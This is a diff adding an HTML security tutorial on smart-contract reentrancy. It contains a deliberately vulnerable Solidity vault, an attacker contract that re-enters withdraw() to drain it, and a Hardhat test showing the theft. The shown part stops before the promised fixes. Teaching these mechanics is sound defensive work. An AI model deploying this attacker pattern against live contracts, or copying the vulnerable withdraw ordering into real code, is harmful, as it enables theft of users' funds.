@@ -1,0 +1,1263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Advanced Security Guide — Reentrancy & CEI</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <!-- Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    :root {
+      --bg: #020617;
+      --bg-elevated: #020617;
+      --card: #020617;
+      --card-soft: #030712;
+      --accent: #facc15;
+      --accent-soft: rgba(250, 204, 21, 0.1);
+      --accent-strong: rgba(250, 204, 21, 0.18);
+      --text-main: #f9fafb;
+      --text-muted: #9ca3af;
+      --border-subtle: rgba(148, 163, 184, 0.3);
+      --border-soft: rgba(148, 163, 184, 0.2);
+      --radius-lg: 22px;
+      --radius-md: 14px;
+      --shadow-soft: 0 18px 45px rgba(15, 23, 42, 0.9);
+      --shadow-glow: 0 0 80px rgba(250, 204, 21, 0.18);
+      --good: #22c55e;
+      --warn: #f97316;
+      --bad: #f87171;
+      --code-bg: rgba(15, 23, 42, 0.94);
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      margin: 0;
+      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: radial-gradient(circle at top left, #0f172a 0, #020617 45%, #000 100%);
+      color: var(--text-main);
+      min-height: 100vh;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    /* Top nav */
+    .nav {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 1.2rem 1.4rem 0.2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 20;
+      backdrop-filter: blur(22px);
+      background: linear-gradient(to bottom, rgba(2, 6, 23, 0.96), rgba(2, 6, 23, 0.75), transparent);
+    }
+
+    .nav-left { display: flex; align-items: center; gap: 0.65rem; }
+    .nav-orb {
+      width: 26px; height: 26px; border-radius: 999px;
+      background: radial-gradient(circle at 30% 20%, #fde047 0, #facc15 26%, #a16207 70%, #0f172a 100%);
+      box-shadow: 0 0 30px rgba(250, 204, 21, 0.6);
+    }
+    .nav-title { font-weight: 600; letter-spacing: -0.03em; font-size: 1rem; }
+    .nav-tagline { font-size: 0.78rem; color: var(--text-muted); }
+
+    .nav-right { display: flex; align-items: center; gap: 0.75rem; font-size: 0.85rem; }
+    .nav-link {
+      padding: 0.4rem 0.7rem; border-radius: 999px; color: var(--text-muted);
+      border: 1px solid transparent; transition: 0.18s ease;
+    }
+    .nav-link:hover {
+      border-color: rgba(148, 163, 184, 0.5);
+      color: var(--text-main);
+      background: rgba(15, 23, 42, 0.8);
+    }
+
+    .nav-pill {
+      border-radius: 999px; padding: 0.4rem 0.9rem;
+      border: 1px solid var(--border-subtle);
+      background: radial-gradient(circle at top left, rgba(250, 204, 21, 0.14), rgba(15, 23, 42, 0.8));
+      color: #fefce8; display: inline-flex; align-items: center; gap: 0.4rem;
+      font-size: 0.8rem;
+    }
+    .nav-pill-dot {
+      width: 6px; height: 6px; border-radius: 999px; background: #bbf7d0;
+      box-shadow: 0 0 11px rgba(74, 222, 128, 0.9);
+    }
+
+    /* Page shell */
+    .page {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 0 1.4rem 3.5rem;
+    }
+
+    /* Hero */
+    .hero {
+      display: grid;
+      grid-template-columns: minmax(0, 3.5fr) minmax(0, 2.3fr);
+      gap: 2.6rem;
+      padding: 2.2rem 0 1.4rem;
+      align-items: center;
+    }
+    @media (max-width: 920px) { .hero { grid-template-columns: minmax(0, 1fr); } }
+
+    .hero-left-label {
+      display: inline-flex; align-items: center; gap: 0.45rem;
+      padding: 0.22rem 0.4rem; border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      font-size: 0.75rem; color: var(--text-muted); margin-bottom: 0.8rem;
+    }
+    .hero-left-label span {
+      padding: 0.16rem 0.5rem; border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.6);
+    }
+
+    .hero-h1 {
+      font-size: clamp(2.35rem, 3vw, 2.9rem);
+      letter-spacing: -0.05em; margin: 0.15rem 0 0.65rem; line-height: 1.05;
+    }
+    .hero-h1 span {
+      background: linear-gradient(120deg, #facc15, #f97316, #22c55e);
+      -webkit-background-clip: text; color: transparent;
+    }
+    .hero-lead {
+      color: var(--text-muted); font-size: 0.98rem; max-width: 38rem;
+      line-height: 1.8; margin-bottom: 1.4rem;
+    }
+
+    .hero-meta { display: flex; flex-wrap: wrap; gap: 0.6rem; margin-bottom: 1.8rem; }
+    .hero-chip {
+      padding: 0.32rem 0.75rem; border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.45);
+      font-size: 0.78rem; color: var(--text-muted);
+      background: rgba(15, 23, 42, 0.85);
+    }
+    .hero-chip b { color: #e5e7eb; font-weight: 600; }
+
+    .hero-actions { display: flex; flex-wrap: wrap; gap: 0.75rem; align-items: center; }
+
+    .btn-primary {
+      padding: 0.7rem 1.4rem; border-radius: 999px; border: 1px solid transparent;
+      background: radial-gradient(circle at 0 0, #facc15, #f97316);
+      color: #030712; font-weight: 600; font-size: 0.9rem;
+      box-shadow: 0 14px 35px rgba(250, 204, 21, 0.45);
+      display: inline-flex; align-items: center; gap: 0.4rem;
+      cursor: pointer; transition: 0.18s ease;
+    }
+    .btn-primary:hover { transform: translateY(-1px); box-shadow: 0 20px 55px rgba(250, 204, 21, 0.65); }
+
+    .btn-ghost {
+      padding: 0.65rem 1.1rem; border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.55);
+      background: rgba(15, 23, 42, 0.9);
+      font-size: 0.85rem; color: var(--text-muted);
+      display: inline-flex; align-items: center; gap: 0.4rem;
+      cursor: pointer; transition: 0.18s ease;
+    }
+    .btn-ghost:hover { border-color: rgba(249, 250, 251, 0.9); color: #e5e7eb; background: rgba(15, 23, 42, 1); }
+
+    .hero-right { position: relative; }
+    .hero-card {
+      border-radius: var(--radius-lg);
+      background:
+        radial-gradient(circle at top left, rgba(250, 204, 21, 0.14), transparent 55%),
+        radial-gradient(circle at bottom right, rgba(56, 189, 248, 0.14), transparent 55%),
+        linear-gradient(to bottom right, #020617, #020617);
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      box-shadow: var(--shadow-soft), var(--shadow-glow);
+      padding: 1rem 1.1rem 1.05rem;
+      position: relative; overflow: hidden;
+    }
+    .hero-card-header {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 0.65rem; font-size: 0.8rem; color: var(--text-muted);
+    }
+    .hero-card-badge {
+      padding: 0.16rem 0.55rem; border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.7);
+      background: rgba(15, 23, 42, 0.9);
+      font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.12em;
+      color: #e5e7eb;
+    }
+    .hero-metric-row { display: flex; justify-content: space-between; gap: 0.5rem; margin-bottom: 0.6rem; font-size: 0.78rem; }
+    .hero-metric-label { color: var(--text-muted); }
+    .hero-metric-value { font-family: "JetBrains Mono", monospace; color: #e5e7eb; }
+
+    .hero-code-box {
+      margin-top: 0.7rem; padding: 0.75rem 0.8rem; border-radius: 16px;
+      background: rgba(15, 23, 42, 0.88);
+      border: 1px solid rgba(148, 163, 184, 0.45);
+      font-family: "JetBrains Mono", monospace; font-size: 0.78rem; color: #e5e7eb;
+      overflow-x: auto; line-height: 1.6;
+    }
+    .hero-code-label {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 0.4rem; font-size: 0.75rem; color: var(--text-muted);
+    }
+
+    /* Sections */
+    .section { margin-top: 2.6rem; }
+    .section-label {
+      font-size: 0.8rem; text-transform: uppercase; letter-spacing: 0.14em;
+      color: var(--text-muted); margin-bottom: 0.4rem;
+    }
+    .section-title {
+      font-size: 1.25rem; letter-spacing: -0.02em; margin-bottom: 1rem;
+    }
+    .section-grid {
+      display: grid;
+      grid-template-columns: minmax(0, 3.2fr) minmax(0, 2.4fr);
+      gap: 1.8rem;
+    }
+    @media (max-width: 900px) { .section-grid { grid-template-columns: minmax(0, 1fr); } }
+
+    .section-text { font-size: 0.96rem; color: var(--text-muted); line-height: 1.7; }
+    .pill-list { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-top: 0.7rem; font-size: 0.8rem; }
+    .pill {
+      padding: 0.3rem 0.65rem; border-radius: 999px;
+      border: 1px solid rgba(148, 163, 184, 0.5);
+      background: rgba(15, 23, 42, 0.9);
+      color: var(--text-muted);
+    }
+
+    .card {
+      border-radius: var(--radius-lg);
+      border: 1px solid rgba(148, 163, 184, 0.45);
+      background: radial-gradient(circle at top left, rgba(250, 204, 21, 0.16), transparent 60%), #020617;
+      padding: 1.2rem 1.25rem;
+      box-shadow: 0 14px 35px rgba(15, 23, 42, 0.9);
+    }
+    .card-soft {
+      border-radius: var(--radius-md);
+      border: 1px solid rgba(148, 163, 184, 0.35);
+      background: rgba(15, 23, 42, 0.9);
+      padding: 1rem 1.05rem;
+      font-size: 0.9rem;
+    }
+    .card-title { font-size: 0.95rem; font-weight: 600; margin-bottom: 0.4rem; }
+    .card-meta { font-size: 0.8rem; color: var(--text-muted); }
+    .step-list { list-style: none; padding: 0; margin: 0.4rem 0 0; font-size: 0.9rem; }
+    .step-list li { margin-bottom: 0.35rem; color: var(--text-muted); }
+
+    /* Code blocks + copy */
+    pre {
+      margin: 1rem 0 1.6rem;
+      padding: 0.9rem 1rem;
+      border-radius: 16px;
+      background: var(--code-bg);
+      border: 1px solid var(--border-soft);
+      box-shadow: 0 16px 34px rgba(15, 23, 42, 0.85);
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.82rem;
+      color: #e5e7eb;
+      overflow-x: auto;
+      line-height: 1.7;
+      position: relative;
+    }
+    pre code { white-space: pre; }
+
+    .copy-btn {
+      position: absolute; top: 10px; right: 10px;
+      font-size: 0.72rem; padding: 0.25rem 0.5rem;
+      border-radius: 999px; border: 1px solid var(--border-subtle);
+      background: rgba(15,23,42,0.95);
+      color: var(--text-muted);
+      cursor: pointer; transition: 0.15s ease;
+      user-select: none;
+    }
+    .copy-btn:hover { color: var(--text-main); border-color: rgba(226,232,240,0.7); }
+
+    .inline-code {
+      font-family: "JetBrains Mono", monospace;
+      font-size: 0.82rem;
+      padding: 0.1rem 0.35rem;
+      border-radius: 999px;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.7);
+      color: #e5e7eb;
+    }
+
+    .tip, .note, .warning {
+      margin: 1rem 0 1.4rem;
+      padding: 0.8rem 0.95rem;
+      border-radius: 14px;
+      font-size: 0.88rem;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(148, 163, 184, 0.5);
+    }
+    .note {
+      border-color: rgba(56, 189, 248, 0.8);
+      background: radial-gradient(circle at top left, rgba(56, 189, 248, 0.18), rgba(15, 23, 42, 0.9));
+    }
+    .warning {
+      border-color: rgba(248, 113, 113, 0.9);
+      background: radial-gradient(circle at top left, rgba(248, 113, 113, 0.16), rgba(15, 23, 42, 0.96));
+    }
+    .tip-title { font-weight: 600; margin-bottom: 0.25rem; color: #e5e7eb; }
+    .tip p, .note p, .warning p { margin: 0; color: var(--text-muted); }
+
+    .two-col {
+      display: grid;
+      grid-template-columns: minmax(0, 1.4fr) minmax(0, 1.7fr);
+      gap: 1.2rem;
+    }
+    @media (max-width: 860px) { .two-col { grid-template-columns: minmax(0, 1fr); } }
+
+    .checklist { list-style: none; padding: 0; margin: 0.4rem 0 0; font-size: 0.9rem; }
+    .checklist li { margin-bottom: 0.35rem; color: var(--text-muted); }
+    .checkmark { color: #bbf7d0; margin-right: 0.4rem; }
+
+    /* Accordion */
+    .accordion {
+      border: 1px solid var(--border-soft);
+      border-radius: 14px;
+      background: rgba(15,23,42,0.9);
+      overflow: hidden;
+      margin: 1rem 0 1.4rem;
+    }
+    .accordion-header {
+      padding: 0.8rem 0.95rem;
+      display: flex; justify-content: space-between; align-items: center;
+      cursor: pointer; user-select: none;
+      color: #e5e7eb; font-weight: 600; font-size: 0.9rem;
+      border-bottom: 1px solid var(--border-soft);
+    }
+    .accordion-header span { color: var(--text-muted); font-weight: 500; font-size: 0.85rem; }
+    .accordion-body {
+      padding: 0.85rem 0.95rem;
+      color: var(--text-muted);
+      font-size: 0.92rem;
+      line-height: 1.7;
+      display: none;
+    }
+    .accordion.open .accordion-body { display: block; }
+    .accordion.open .accordion-header { background: rgba(2,6,23,0.9); }
+
+    /* Callouts */
+    .risk-grid{
+      display:grid;
+      grid-template-columns:repeat(3,minmax(0,1fr));
+      gap:1rem;
+      margin-top:1rem;
+    }
+    @media(max-width:900px){ .risk-grid{ grid-template-columns:1fr; } }
+    .risk {
+      border:1px solid var(--border-subtle);
+      border-radius:14px;
+      padding:0.9rem 1rem;
+      background:rgba(15,23,42,0.9);
+    }
+    .risk h4{
+      margin:0 0 0.35rem;
+      font-size:0.95rem;
+      letter-spacing:-0.01em;
+    }
+    .risk p{ margin:0; color:var(--text-muted); font-size:0.9rem; line-height:1.6; }
+    .risk.good h4{ color:var(--good); }
+    .risk.warn h4{ color:var(--warn); }
+    .risk.bad h4{ color:var(--bad); }
+
+    /* Progress widget */
+    .progress {
+      position: fixed; right: 18px; bottom: 18px; z-index: 50;
+      background: rgba(2,6,23,0.9);
+      border:1px solid var(--border-subtle);
+      backdrop-filter: blur(10px);
+      padding: 0.7rem 0.85rem;
+      border-radius: 14px;
+      width: 180px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.5);
+      font-size: 0.82rem;
+      color: var(--text-muted);
+    }
+    .progress strong { color: var(--text-main); font-weight: 600; }
+    .progress-bar {
+      height: 8px; border-radius: 999px; background: rgba(148,163,184,0.2);
+      overflow: hidden; margin-top: 0.5rem;
+    }
+    .progress-bar-fill {
+      height: 100%; width: 0%;
+      background: linear-gradient(90deg, #facc15, #f97316);
+      transition: width 0.15s ease;
+    }
+    .progress-actions {
+      display:flex; justify-content:space-between; margin-top:0.6rem; gap:0.4rem;
+    }
+    .progress-btn {
+      flex:1;
+      text-align:center;
+      padding:0.35rem 0.5rem;
+      border-radius:10px;
+      border:1px solid var(--border-soft);
+      background:rgba(15,23,42,0.9);
+      cursor:pointer;
+      transition:0.15s;
+      color:var(--text-muted);
+    }
+    .progress-btn:hover { color:var(--text-main); border-color:rgba(226,232,240,0.7); }
+
+    /* Footer */
+    footer {
+      max-width: 1120px;
+      margin: 0 auto;
+      padding: 2rem 1.4rem 2.4rem;
+      border-top: 1px solid rgba(51, 65, 85, 0.8);
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+      gap: 0.6rem;
+    }
+    .footer-links { display: flex; flex-wrap: wrap; gap: 0.7rem; font-size: 0.84rem; }
+    .footer-links a { color: var(--text-muted); }
+    .footer-links a:hover { color: #e5e7eb; }
+
+    section[id] { scroll-margin-top: 90px; }
+
+    .nav-donate-btn {
+      padding: 0.55rem 1.2rem;
+      border-radius: 999px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      background: radial-gradient(circle at 0 0, #facc15, #f97316);
+      color: #030712;
+      border: 1px solid transparent;
+      box-shadow: 0 10px 24px rgba(250, 204, 21, 0.45);
+      transition: 0.18s ease;
+      line-height: 1;
+      height: 32px;
+    }
+
+    .nav-donate-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 14px 35px rgba(250, 204, 21, 0.65);
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- TOP NAV -->
+  <header class="nav">
+    <div class="nav-left">
+      <div class="nav-orb"></div>
+      <div>
+        <div class="nav-title">web3.studio</div>
+        <div class="nav-tagline">Guides • Hardhat • Solidity • Security</div>
+      </div>
+    </div>
+
+    <div class="nav-right">
+      <a href="../index.html" class="nav-link">Home</a>
+      <a href="../guides.html" class="nav-link">All guides</a>
+       <a href="../donate.html" class="nav-donate-btn">Donate</a>
+      <span class="nav-pill">
+        <span class="nav-pill-dot"></span>
+        Advanced track
+      </span>
+    </div>
+  </header>
+
+  <main class="page">
+    <!-- HERO -->
+    <section class="hero">
+      <div>
+        <div class="hero-left-label">
+          <span>Advanced • Security</span>
+          Reentrancy &amp; Checks-Effects-Interactions
+        </div>
+
+        <h1 class="hero-h1">
+          Break a vault with <span>reentrancy</span>,<br />then fix it the right way.
+        </h1>
+
+        <p class="hero-lead">
+          In this advanced security guide you’ll build a vulnerable Ether vault, exploit it in tests,
+          and then harden it using CEI, reentrancy guards, and safer transfer patterns.
+          No fluff — just real exploit mechanics and real fixes.
+        </p>
+
+        <div class="hero-meta">
+          <div class="hero-chip"><b>Level</b> · Advanced</div>
+          <div class="hero-chip"><b>Stack</b> · Hardhat 3, TS, Solidity</div>
+          <div class="hero-chip"><b>Time</b> · ~90 minutes</div>
+          <div class="hero-chip"><b>Focus</b> · Exploit → Patch → Verify</div>
+        </div>
+
+        <div class="hero-actions">
+          <a href="#overview" class="btn-primary">Start guide <span>↓</span></a>
+          <a href="#exploit-tests" class="btn-ghost">Jump to exploit</a>
+        </div>
+      </div>
+
+      <div class="hero-right">
+        <div class="hero-card">
+          <div class="hero-card-header">
+            <span>What you’ll build</span>
+            <span class="hero-card-badge">VULNERABLE VAULT</span>
+          </div>
+
+          <div class="hero-metric-row">
+            <span class="hero-metric-label">Target</span>
+            <span class="hero-metric-value">EtherVault.sol</span>
+          </div>
+          <div class="hero-metric-row">
+            <span class="hero-metric-label">Bug class</span>
+            <span class="hero-metric-value">Reentrancy</span>
+          </div>
+          <div class="hero-metric-row">
+            <span class="hero-metric-label">Exploit</span>
+            <span class="hero-metric-value">Attack.sol</span>
+          </div>
+
+          <div class="hero-code-box">
+            <div class="hero-code-label">
+              <span>contracts/EtherVault.sol</span>
+              <span>broken withdraw()</span>
+            </div>
+            <code>function withdraw(uint256 amount) external {
+    require(balances[msg.sender] >= amount);
+    (bool ok,) = msg.sender.call{value: amount}("");
+    require(ok, "send failed");
+    balances[msg.sender] -= amount; // <-- too late
+}</code>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- OVERVIEW -->
+    <section id="overview" class="section">
+      <div class="section-label">Overview</div>
+      <h2 class="section-title">What you’ll learn</h2>
+
+      <div class="section-grid">
+        <div class="section-text">
+          <p>
+            Reentrancy is still the #1 real-world exploit class for a reason:
+            it’s simple, sneaky, and devastating when state updates happen after external calls.
+          </p>
+          <ul>
+            <li>How a reentrancy loop works at EVM level</li>
+            <li>How to write a minimal vulnerable vault</li>
+            <li>How to craft an attacker contract</li>
+            <li>How to reproduce the bug in Hardhat 3 + TypeScript tests</li>
+            <li>How to fix with CEI and verify via tests</li>
+            <li>When CEI is enough and when you still need guards</li>
+          </ul>
+
+          <div class="note">
+            <div class="tip-title">This is advanced</div>
+            <p>
+              You should already be comfortable with Solidity basics, tests,
+              and deployment. We’ll move fast.
+            </p>
+          </div>
+        </div>
+
+        <div>
+          <div class="card">
+            <div class="card-title">Prerequisites</div>
+            <div class="card-meta">You should be comfortable with:</div>
+            <ul class="checklist">
+              <li><span class="checkmark">✓</span> Solidity control flow</li>
+              <li><span class="checkmark">✓</span> Hardhat 3 TS projects</li>
+              <li><span class="checkmark">✓</span> ethers v6 in tests</li>
+              <li><span class="checkmark">✓</span> msg.sender / call / fallback</li>
+            </ul>
+            <div class="card-meta" style="margin-top:0.6rem;">
+              Nice-to-have:
+            </div>
+            <ul class="checklist">
+              <li><span class="checkmark">•</span> Familiarity with CEI</li>
+              <li><span class="checkmark">•</span> EVM gas basics</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- WHY REENTRANCY -->
+    <section id="reentrancy-intro" class="section">
+      <div class="section-label">Step 0</div>
+      <h2 class="section-title">Reentrancy in one picture</h2>
+
+      <div class="section-text">
+        <p>
+          The core pattern is always the same:
+          <b>contract sends value to attacker before updating state</b>.
+          If attacker can execute code during that send, they can call back into the victim
+          while their balance is still “old”.
+        </p>
+
+        <div class="risk-grid">
+          <div class="risk bad">
+            <h4>🚨 Vulnerable order</h4>
+            <p>
+              Interaction before Effects. External call happens while balances
+              are still unchanged.
+            </p>
+          </div>
+          <div class="risk good">
+            <h4>✅ Safe order (CEI)</h4>
+            <p>
+              Effects first. Update storage, then call out.
+            </p>
+          </div>
+          <div class="risk warn">
+            <h4>🛡 Guarded order</h4>
+            <p>
+              Even if CEI is missed, a reentrancy lock blocks recursion.
+            </p>
+          </div>
+        </div>
+
+        <div class="accordion">
+          <div class="accordion-header">
+            Why does this still happen in 2025?
+            <span>open</span>
+          </div>
+          <div class="accordion-body">
+            <ul>
+              <li>Developers copy old snippets using <span class="inline-code">call</span>.</li>
+              <li>State updates are split across internal functions.</li>
+              <li>Multiple external calls in one function make order tricky.</li>
+              <li>“Looks safe” ≠ safe: e.g. ERC-777 hooks, fallback proxies.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SETUP -->
+    <section id="setup" class="section">
+      <div class="section-label">Step 1</div>
+      <h2 class="section-title">Project setup (Hardhat 3 + TS)</h2>
+
+      <div class="two-col">
+        <div class="section-text">
+          <p>Create a new folder:</p>
+          <pre><button class="copy-btn">Copy</button><code>mkdir reentrancy-guide
+cd reentrancy-guide
+npm init -y</code></pre>
+
+          <p>Install Hardhat 3:</p>
+          <pre><button class="copy-btn">Copy</button><code>npm install --save-dev hardhat</code></pre>
+
+          <p>Initialize a TypeScript project:</p>
+          <pre><button class="copy-btn">Copy</button><code>npx hardhat</code></pre>
+
+          <p>Choose “Create a TypeScript project”, install dependencies.</p>
+
+          <p>Optional but recommended packages:</p>
+          <pre><button class="copy-btn">Copy</button><code>npm install @openzeppelin/contracts
+npm install --save-dev @nomicfoundation/hardhat-toolbox-ethers dotenv</code></pre>
+
+          <div class="tip">
+            <div class="tip-title">Clean the template</div>
+            <p>
+              Delete Lock.sol and Lock.ts — we’ll write our own vault.
+            </p>
+          </div>
+        </div>
+
+        <div>
+          <div class="card-soft">
+            <div class="card-title">Your structure should look like:</div>
+            <pre style="margin:0;"><code>.
+├─ contracts/
+├─ scripts/
+├─ test/
+├─ hardhat.config.ts
+└─ tsconfig.json</code></pre>
+          </div>
+
+          <div class="card-soft" style="margin-top:1rem;">
+            <div class="card-title">Hardhat config</div>
+            <p class="card-meta">Minimal working config:</p>
+            <pre><button class="copy-btn">Copy</button><code>// hardhat.config.ts
+import { defineConfig } from "hardhat/config";
+import "@nomicfoundation/hardhat-toolbox-ethers";
+
+export default defineConfig({
+  solidity: "0.8.20",
+});</code></pre>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- VULNERABLE VAULT -->
+    <section id="vulnerable-vault" class="section">
+      <div class="section-label">Step 2</div>
+      <h2 class="section-title">Write a vulnerable Ether vault</h2>
+
+      <div class="section-text">
+        <p>
+          Create <span class="inline-code">contracts/EtherVault.sol</span>.
+          This vault lets users deposit ETH and withdraw later.
+          We'll intentionally place the external call before state update.
+        </p>
+
+        <pre><button class="copy-btn">Copy</button><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+contract EtherVault {
+    mapping(address => uint256) public balances;
+
+    event Deposit(address indexed user, uint256 amount);
+    event Withdraw(address indexed user, uint256 amount);
+
+    function deposit() external payable {
+        require(msg.value &gt; 0, "zero deposit");
+        balances[msg.sender] += msg.value;
+        emit Deposit(msg.sender, msg.value);
+    }
+
+    function withdraw(uint256 amount) external {
+        require(balances[msg.sender] &gt;= amount, "insufficient");
+
+        // ❌ INTERACTION first (external call)
+        (bool ok,) = msg.sender.call{value: amount}("");
+        require(ok, "send failed");
+
+        // ❌ EFFECTS last (state update too late)
+        balances[msg.sender] -= amount;
+
+        emit Withdraw(msg.sender, amount);
+    }
+
+    function vaultBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}</code></pre>
+
+        <div class="warning">
+          <div class="tip-title">Why this is vulnerable</div>
+          <p>
+            <span class="inline-code">msg.sender.call()</span> gives control to the receiver.
+            If receiver is a contract, its fallback can call <span class="inline-code">withdraw()</span>
+            again before the balance is reduced.
+          </p>
+        </div>
+
+        <p>Compile:</p>
+        <pre><button class="copy-btn">Copy</button><code>npx hardhat compile</code></pre>
+      </div>
+    </section>
+
+    <!-- ATTACKER -->
+    <section id="attacker-contract" class="section">
+      <div class="section-label">Step 3</div>
+      <h2 class="section-title">Build the attacker contract</h2>
+
+      <div class="section-text">
+        <p>
+          Create <span class="inline-code">contracts/VaultAttacker.sol</span>.
+          It deposits some ETH, calls withdraw, and in fallback re-enters until vault is drained.
+        </p>
+
+        <pre><button class="copy-btn">Copy</button><code>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "./EtherVault.sol";
+
+contract VaultAttacker {
+    EtherVault public vault;
+    address public owner;
+    uint256 public reenterAmount;
+
+    constructor(address vaultAddress) {
+        vault = EtherVault(vaultAddress);
+        owner = msg.sender;
+    }
+
+    // start attack by depositing & withdrawing once
+    function attack() external payable {
+        require(msg.sender == owner, "not owner");
+        require(msg.value &gt; 0, "no eth");
+
+        reenterAmount = msg.value;
+
+        vault.deposit{value: msg.value}();
+        vault.withdraw(reenterAmount);
+    }
+
+    // fallback runs when vault sends ETH
+    receive() external payable {
+        uint256 vaultBal = address(vault).balance;
+
+        if (vaultBal &gt;= reenterAmount) {
+            vault.withdraw(reenterAmount);
+        }
+    }
+
+    function sweep() external {
+        require(msg.sender == owner, "not owner");
+        (bool ok,) = owner.call{value: address(this).balance}("");
+        require(ok, "sweep failed");
+    }
+
+    function attackerBalance() external view returns (uint256) {
+        return address(this).balance;
+    }
+}</code></pre>
+
+        <div class="note">
+          <div class="tip-title">Key idea</div>
+          <p>
+            The attacker’s <span class="inline-code">receive()</span> executes during the victim’s
+            send operation. That’s the “reentrancy window”.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- EXPLOIT TESTS -->
+    <section id="exploit-tests" class="section">
+      <div class="section-label">Step 4</div>
+      <h2 class="section-title">Exploit the vault in TypeScript tests</h2>
+
+      <div class="section-text">
+        <p>
+          Create <span class="inline-code">test/reentrancy.ts</span>.
+          We’ll set up: two honest users deposit, attacker drains all.
+        </p>
+
+        <pre><button class="copy-btn">Copy</button><code>import { expect } from "chai";
+import { ethers } from "hardhat";
+
+describe("Reentrancy exploit walkthrough", function () {
+  async function deployFixture() {
+    const [deployer, alice, bob, attackerEOA] = await ethers.getSigners();
+
+    const Vault = await ethers.getContractFactory("EtherVault", deployer);
+    const vault = await Vault.deploy();
+    await vault.waitForDeployment();
+
+    const Attacker = await ethers.getContractFactory("VaultAttacker", attackerEOA);
+    const attacker = await Attacker.deploy(await vault.getAddress());
+    await attacker.waitForDeployment();
+
+    return { vault, attacker, deployer, alice, bob, attackerEOA };
+  }
+
+  it("drains the vault due to reentrancy", async function () {
+    const { vault, attacker, alice, bob, attackerEOA } = await deployFixture();
+
+    // Honest deposits
+    await vault.connect(alice).deposit({ value: ethers.parseEther("5") });
+    await vault.connect(bob).deposit({ value: ethers.parseEther("5") });
+
+    const startVaultBalance = await vault.vaultBalance();
+    expect(startVaultBalance).to.equal(ethers.parseEther("10"));
+
+    // Attacker starts with 1 ETH
+    await attacker.connect(attackerEOA).attack({ value: ethers.parseEther("1") });
+
+    const endVaultBalance = await vault.vaultBalance();
+    const attackerBal = await attacker.attackerBalance();
+
+    // Vault should be empty
+    expect(endVaultBalance).to.equal(0n);
+
+    // Attacker stole 10 ETH (honest users) + got back its own 1 ETH reentered repeatedly
+    expect(attackerBal).to.be.greaterThan(ethers.parseEther("10"));
+  });
+});</code></pre>
+
+        <p>Run tests:</p>
+        <pre><button class="copy-btn">Copy</button><code>npx hardhat test</code></pre>
+
+        <div class="tip">
+          <div class="tip-title">If your test fails</div>
+          <p>
+            Add logs for balances (vault, attacker, EOAs). Reentrancy bugs are easier to see with numbers.
+          </p>
+        </div>
+      </div>
+    </section>
+
+    <!-- DEEP DIVE: HOW LOOP WORKS -->
+    <section id="deep-dive-loop" class="section">
+      <div class="section-label">Deep dive</div>
+      <h2 class="section-title">What exactly happens during the exploit?</h2>
+
+      <div class="section-text">
+        <p>
+          Let’s walk slooowly through a single withdraw:
+        </p>
+
+        <ol>
+          <li>Attacker calls <span class="inline-code">vault.withdraw(1 ETH)</span>.</li>
+          <li>Vault checks balance OK.</li>
+          <li>Vault sends 1 ETH with <span class="inline-code">call</span> → control jumps to attacker’s receive().</li>
+          <li>Attacker sees vault still has ETH and calls <span class="inline-code">withdraw()</span> again.</li>
+          <li>Vault repeats step 2-4 because it still thinks attacker’s balance is unchanged.</li>
+          <li>Only after recursion ends, original calls resume and update balances, but it’s too late.</li>
+        </ol>
+
+        <div class="accordion">
+          <div class="accordion-header">Why call() enables this? <span>open</span></div>
+          <div class="accordion-body">
+            <p>
+              Unlike <span class="inline-code">transfer</span> (2300 gas) or
+              <span class="inline-code">send</span> (same gas limit),
+              <span class="inline-code">call</span> forwards all remaining gas by default.
+              That lets receivers execute arbitrary logic, including calling back.
+            </p>
+          </div>
+        </div>
+
+        <div class="accordion">
+          <div class="accordion-header">Is transfer safe then? <span>open</span></div>
+          <div class="accordion-body">
+            <p>
+              Not really for modern Solidity. Gas costs change (EIP-1884 etc.),
+              so 2300 gas can break receivers and make your contract unusable.
+              Modern best practice is: use <span class="inline-code">call</span> but protect logic with CEI/guards.
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
